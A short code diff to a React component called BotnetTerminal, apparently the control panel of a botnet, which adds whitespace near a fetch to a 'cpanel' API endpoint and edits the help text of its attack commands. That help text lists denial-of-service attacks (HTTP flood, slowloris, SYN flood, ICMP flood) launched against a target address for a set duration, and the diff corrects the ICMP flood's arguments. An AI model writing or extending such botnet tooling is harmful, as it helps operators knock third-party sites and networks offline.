@@ -96,6 +96,8 @@ export const BotnetTerminal = () => {
 
     }
 
+    
+
     try {
       const requests = await fetch(`${import.meta.env.VITE_API_URL}/api/rcv/cpanel/all`, {
         method: 'POST',
@@ -150,7 +152,7 @@ export const BotnetTerminal = () => {
           http_flood             <http://host:port>         <duration>
           slowloris              <target_ip:port>           <duration>         (NO http/https)
           syn_flood              <target_ip:port>           <duration>         (NO http/https)
-          icmp_flood             <target_ip:port>           <duration>         (NO http/https)
+          icmp_flood             <target_ip>                <duration>         (NO http/https)
 
            _______________Stop attacks____________
           |__Arg 1__|_____________|______Arg2____|
